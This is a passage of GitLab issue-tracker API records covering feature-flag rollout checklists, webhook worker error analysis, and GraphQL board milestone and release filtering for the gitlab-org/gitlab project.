Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"type":"ISSUE","assignee":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337721","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337721","notes":"https://gitlab.com/api/v4/projects/278964/issues/337721/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337721/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337721","relative":"#337721","full":"gitlab-org/gitlab#337721"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91469308,"iid":337720,"project_id":278964,"title":"[Storage] [Feature flag] Remove the 'new_route_storage_purchase' feature flag","description":"In order to rollout feature flag `:new_route_storage_purchase` and release the feature CI Minutes, we proceed as follow:\n\n|||\n|-|-|\n| roll-out `:new_route_storage_purchase` | gitlab-org/gitlab#327896 |\n| release the feature and remove `:new_route_storage_purchase` | 👈 you are here |\n\n## Summary\n\nThis issue is to roll out [the feature](https://gitlab.com/groups/gitlab-org/-/epics/5789) on production,\nthat is currently behind the `\u003cnew_route_storage_purchase\u003e` feature flag.\n\nThe feature is updating the Storage purchase from an external one (on Customers Portal) to the one embedded in GitLab. More details in the [Epic](https://gitlab.com/groups/gitlab-org/-/epics/5789).\n\n## Owners\n\n- Team: ~16487743 \n- Most appropriate slack channel to reach out to: `#g_purchase`\n- Best individual to reach out to: @agulina \n- PM: @tgolubeva \n\n## Stakeholders\n\n## The Rollout Plan\n\n- [ ] Partial Rollout on GitLab.com with testing groups\n- [ ] Rollout on GitLab.com for a certain period (2 milestones)\n- [ ] Percentage Rollout on GitLab.com\n- [ ] Rollout Feature for everyone as soon as it's ready\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? Sentry errors reports can also be useful to review --\u003e\n\n## Testing Groups/Projects/Users\n\n\u003c!-- If applicable, any groups/projects that are happy to have this feature turned on early. Some organizations may wish to test big changes they are interested in with a small subset of users ahead of time for example. --\u003e\n\n- \n\n## Expectations\n\n### What are we expecting to happen?\n\nWhen a group is eligible for purchasing additional Storage... \n\n### What might happen if this goes wrong?\n\nIf something goes wrong, the customers won't be able to purchase additional Storage. Disabling the FF will be sufficient to solve any incident.\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n\n## Rollout Steps\n\nThe rollout part is handled with gitlab-org/gitlab#327896\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [x] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [x] Remove all references to the feature flag from the codebase.\n    - [x] Remove the YAML definitions for the feature from the repository.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [x] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [x] Close [the feature issue](https://gitlab.com/groups/gitlab-org/-/epics/5789) to indicate the feature will be released in the current milestone.\n- [x] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [-] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev` NOT RELEVANT\n    - [x] `/chatops run feature delete new_route_storage_purchase --staging`\n    - [x] `/chatops run feature delete new_route_storage_purchase`\n- [x] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set new_route_storage_purchase false\n```","state":"closed","created_at":"2021-08-05T04:54:55.813Z","updated_at":"2022-02-17T22:40:18.081Z","closed_at":"2022-02-17T22:16:15.043Z","closed_by":{"id":10325315,"username":"vvempati","name":"Vamsi Vempati","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10325315/avatar.png","web_url":"https://gitlab.com/vvempati"},"labels":["Category:Purchase","Unplanned","auto updated","devops::fulfillment","feature flag","frontend","group::purchase","section::fulfillment","type::feature","workflow::production"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":10325315,"username":"vvempati","name":"Vamsi Vempati","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10325315/avatar.png","web_url":"https://gitlab.com/vvempati"}],"author":{"id":6348276,"username":"agulina","name":"Angelo Gulina","state":"active","avatar_url":"https://secure.gravatar.com/avatar/b28693a558066993ea93b7272208d285?s=80\u0026d=identicon","web_url":"https://gitlab.com/agulina"},"type":"ISSUE","assignee":{"id":10325315,"username":"vvempati","name":"Vamsi Vempati","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10325315/avatar.png","web_url":"https://gitlab.com/vvempati"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337720","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":16,"completed_count":11},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"11 of 16 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337720","notes":"https://gitlab.com/api/v4/projects/278964/issues/337720/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337720/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337720","relative":"#337720","full":"gitlab-org/gitlab#337720"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5789,"epic":{"id":251641,"iid":5789,"title":"Move Storage purchase flows to GitLab.com (Group namespaces only)","url":"/groups/gitlab-org/-/epics/5789","group_id":9970,"human_readable_end_date":"Feb 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91464319,"iid":337711,"project_id":278964,"title":"[Feature flag] Rollout of `dast_meta_tag_validation`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [the feature](ISSUE LINK) on production,\nthat is currently behind the `dast_meta_tag_validation` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: ~\"group::dynamic analysis\" \n- Most appropriate slack channel to reach out to: `#g_secure-dynamic-analysis`\n- Best individual to reach out to: @djadmin @philipcunningham \n- PM: @derekferguson \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## The Rollout Plan\n\n- Partial Rollout on GitLab.com with testing groups\n- Rollout on GitLab.com for a certain period (How long)\n- Percentage Rollout on GitLab.com\n- Rollout Feature for everyone as soon as it's ready\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? Sentry errors reports can also be useful to review --\u003e\n\n## Testing Groups/Projects/Users\n\n\u003c!-- If applicable, any groups/projects that are happy to have this feature turned on early. Some organizations may wish to test big changes they are interested in with a small subset of users ahead of time for example. --\u003e\n\n- `gitlab-org/gitlab` project\n- `gitlab-org`/`gitlab-com` groups\n- ...\n\n\n## Expectations\n\n### What are we expecting to happen?\n\n\u003c!-- Describe the expected outcome when rolling out this feature --\u003e\n\n### What might happen if this goes wrong?\n\n\u003c!-- Should the feature flag be turned off? Any MRs that need to be rolled back? Communication that needs to happen? What are some things you can think of that could go wrong - data loss or broken pages? --\u003e\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- [ ] Ensure that the feature MRs have been deployed to non-production environments.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [ ] `/chatops run feature set dast_meta_tag_validation true --dev`\n    - [x] `/chatops run feature set dast_meta_tag_validation true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Preparation before production rollout\n\n- [x] Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [x] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] If the feature might impact the user experience, notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n- [x] If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), enable it on GitLab.com for [testing groups/projects](#testing-groupsprojectsusers).\n    - [ ] `/chatops run feature set --\u003cactor-type\u003e=\u003cactor\u003e dast_meta_tag_validation true`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Global rollout on production\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set dast_meta_tag_validation \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set dast_meta_tag_validation \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set dast_meta_tag_validation true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [x] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [x] Create a merge request with the following changes. Ask for review and merge it.\n    - [x] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `dast_meta_tag_validation`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `dast_meta_tag_validation` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete dast_meta_tag_validation --dev`\n    - [ ] `/chatops run feature delete dast_meta_tag_validation --staging`\n    - [ ] `/chatops run feature delete dast_meta_tag_validation`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set dast_meta_tag_validation false\n```","state":"closed","created_at":"2021-08-05T01:01:01.838Z","updated_at":"2021-08-17T02:45:46.362Z","closed_at":"2021-08-17T02:45:46.350Z","closed_by":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"labels":["Category:DAST","backend","devops::secure","feature flag","frontend","group::dynamic analysis","section::sec","type::feature"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},{"id":5749348,"username":"philipcunningham","name":"Philip Cunningham","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5749348/avatar.png","web_url":"https://gitlab.com/philipcunningham"}],"author":{"id":5749348,"username":"philipcunningham","name":"Philip Cunningham","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5749348/avatar.png","web_url":"https://gitlab.com/philipcunningham"},"type":"ISSUE","assignee":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337711","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":47,"completed_count":16},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"16 of 47 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337711","notes":"https://gitlab.com/api/v4/projects/278964/issues/337711/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337711/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337711","relative":"#337711","full":"gitlab-org/gitlab#337711"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6460,"epic":{"id":315399,"iid":6460,"title":"DAST Site validation - Meta tag","url":"/groups/gitlab-org/-/epics/6460","group_id":9970,"human_readable_end_date":"Sep 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91463833,"iid":337708,"project_id":278964,"title":"WebHook worker logs 12k unhandled errors per week","description":"`WebHookWorker` experiences ~12k unhandled errors per week:\n\n![image](/uploads/668c19e2b636c178b27dc94d0a6b0e6b/image.png)\n\nThe [errors are](https://log.gprd.gitlab.net/goto/6b107cfcb10bfd468b332107f71541f1):\n\n![image](/uploads/dab5b83d4b44a814a04e209f965b8282/image.png)\n\n**EOFError**\n\n`EOFError` can be due to [using port `443` without SSL](https://www.exceptionalcreatures.com/bestiary/EOFError.html#1-incorrect-request-format), or [transient network failures](https://www.exceptionalcreatures.com/bestiary/EOFError.html#2-transient-network-outages).\n\nThe SSL configuration problem is unlikely because [`HTTParty` handles setting this](https://github.com/jnunemaker/httparty/blob/b9a54d8/spec/httparty/connection_adapter_spec.rb#L85-L97), so it's like this error is due to the remote server terminating the connection.\n\n**JobReplicaNotUpToDate**\n\nIdeally this shouldn't cause an error that counts against our error budget, but for now, let's leave it as it requeues the job, which is what I assume it is intended to do.\n\n**ActiveRecord::RecordNotFound**\n\nMust happen soon after a webhook is deleted.\n\n**Errno::ENETUNREACH**\n\nShould probably be handled the same as `Errno::EHOSTUNREACH` is, in `Gitlab::HTTP`.","state":"closed","created_at":"2021-08-05T00:35:03.001Z","updated_at":"2022-11-24T18:22:24.596Z","closed_at":"2021-08-11T04:53:23.807Z","closed_by":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"labels":["Category:Webhooks","backend","devops::manage","group::integrations","section::dev","type::bug","workflow::verification"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"}],"author":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"type":"ISSUE","assignee":{"id":2702368,"username":".luke","name":"Luke Duncalfe","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2702368/avatar.png","web_url":"https://gitlab.com/.luke"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337708","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337708","notes":"https://gitlab.com/api/v4/projects/278964/issues/337708/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337708/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337708","relative":"#337708","full":"gitlab-org/gitlab#337708"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6913,"epic":{"id":370101,"iid":6913,"title":"Integrations Error Budgets","url":"/groups/gitlab-org/-/epics/6913","group_id":9970},"iteration":null,"health_status":null},{"id":91462519,"iid":337688,"project_id":278964,"title":"On GraphQL boards, add support for milestone wildcard search","description":"This is the ~frontend part of https://gitlab.com/gitlab-org/gitlab/-/issues/337687\n\nSimply remove defaultMilestones from tokens in issue_board_filtered_search.vue and make sure the following shows up in search:\n\n* None\n* Any\n* Upcoming\n* Started\n\n---\n### Feature Flag\n\nWe're working on refactoring filtered search on boards to use GraphQL. This issue is part of that work, and is behind the `:issue_boards_filtered_search` feature flag.","state":"closed","created_at":"2021-08-04T23:20:08.279Z","updated_at":"2021-11-30T20:32:17.988Z","closed_at":"2021-11-30T20:32:17.982Z","closed_by":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"labels":["auto updated","devops::plan","feature::addition","frontend","section::dev","type::feature","workflow::in dev"],"milestone":null,"assignees":[{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"}],"author":{"id":4447636,"username":"sstern","name":"Scott Stern","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4447636/avatar.png","web_url":"https://gitlab.com/sstern"},"type":"ISSUE","assignee":{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337688","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337688","notes":"https://gitlab.com/api/v4/projects/278964/issues/337688/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337688/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337688","relative":"#337688","full":"gitlab-org/gitlab#337688"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6517,"epic":{"id":320221,"iid":6517,"title":"Completely use new filtered search tokens on group/project issue boards","url":"/groups/gitlab-org/-/epics/6517","group_id":9970,"human_readable_end_date":"Dec 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91462447,"iid":337687,"project_id":278964,"title":"Add graphql support for adding default milestone title values","description":"Currently, in graphql, we are able to filter board lists AND board list items by `ANY` and `NONE` milestone, using the `milestoneTitle` field. However, it is not currently possible to use `STARTED` or `UPCOMING` and the `milestoneTitle` is not the correct field for this query anyway.\n\nInstead we should implement a `milestoneWildcardId` field, which accepts the `STARTED`, `UPCOMING`, `ANY`, and `NONE` types.\n\nThis issue should add this field, probably to the [BoardIssueInputType](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/graphql/types/boards/board_issue_input_base_type.rb) so that this query is possible:\n\n```graphql\nquery boardsFiltered {\n  group(fullPath: \"gitlab-org\") {\n    board(id: \"gid://gitlab/Board/1896794\") {\n      id\n      lists(id: \"gid://gitlab/List/5491995\", issueFilters: { milestoneWildcardId: STARTED }) {\n      \tedges {\n          node {\n            id\n            issuesCount\n            label {\n              id\n              title\n            }\n            issues(filters: { milestoneWildcardId: STARTED }) {\n              edges { \n                node {\n                  title\n                  milestone {\n                    title\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\nAn example of similar work is in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/65932","state":"closed","created_at":"2021-08-04T23:16:57.378Z","updated_at":"2021-09-29T14:42:26.403Z","closed_at":"2021-09-29T14:42:26.384Z","closed_by":{"id":508743,"username":"jarka","name":"Jarka Košanová","state":"active","avatar_url":"https://secure.gravatar.com/avatar/3931dae84deb01d2881e4909077b8dbe?s=80\u0026d=identicon","web_url":"https://gitlab.com/jarka"},"labels":["auto updated","backend","devops::plan","feature::enhancement","good for new contributors","group::product planning","section::dev","type::feature","workflow::verification"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":508743,"username":"jarka","name":"Jarka Košanová","state":"active","avatar_url":"https://secure.gravatar.com/avatar/3931dae84deb01d2881e4909077b8dbe?s=80\u0026d=identicon","web_url":"https://gitlab.com/jarka"}],"author":{"id":4447636,"username":"sstern","name":"Scott Stern","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4447636/avatar.png","web_url":"https://gitlab.com/sstern"},"type":"ISSUE","assignee":{"id":508743,"username":"jarka","name":"Jarka Košanová","state":"active","avatar_url":"https://secure.gravatar.com/avatar/3931dae84deb01d2881e4909077b8dbe?s=80\u0026d=identicon","web_url":"https://gitlab.com/jarka"},"user_notes_count":15,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337687","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337687","notes":"https://gitlab.com/api/v4/projects/278964/issues/337687/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337687/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337687","relative":"#337687","full":"gitlab-org/gitlab#337687"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6517,"epic":{"id":320221,"iid":6517,"title":"Completely use new filtered search tokens on group/project issue boards","url":"/groups/gitlab-org/-/epics/6517","group_id":9970,"human_readable_end_date":"Dec 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91461644,"iid":337686,"project_id":278964,"title":"Add ability to filter by releases on Boards through GraphQL","description":"Need to add the token to GraphQL filtered search. This is currently available for Boards with the following query:\n\n```\nfragment ReleaseFilters on BoardList{\n  issues(filters: { releaseTag: \"release\" }){\n    nodes\n  }\n}\n```\n\n---\n### Feature Flag\n\nWe're working on refactoring filtered search on boards to use GraphQL. This issue is part of that work, and is behind the `:issue_boards_filtered_search` feature flag.","state":"closed","created_at":"2021-08-04T22:44:34.368Z","updated_at":"2021-11-30T01:22:41.445Z","closed_at":"2021-11-30T01:22:41.430Z","closed_by":{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"},"labels":["auto updated","backend","devops::plan","feature::addition","frontend","group::project management","section::dev","type::feature","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":2880930,"username":"engwan","name":"Heinrich Lee Yu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2880930/avatar.png","web_url":"https://gitlab.com/engwan"},{"id":4846639,"username":"fguibert","name":"Florie Guibert","state":"active","avatar_url":"https://secure.gravatar.com/avatar/705331e7e375d5832c9fa5309370b55f?s=80\u0026d=identicon","web_url":"https://gitlab.com/fguibert"}],"author":{"id":4447636,"username":"sstern","name":"Scott Stern","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4447636/avatar.png","web_url":"https://gitlab.com/sstern"},"type":"ISSUE","assignee":{"id":2880930,"username":"engwan","name":"Heinrich Lee 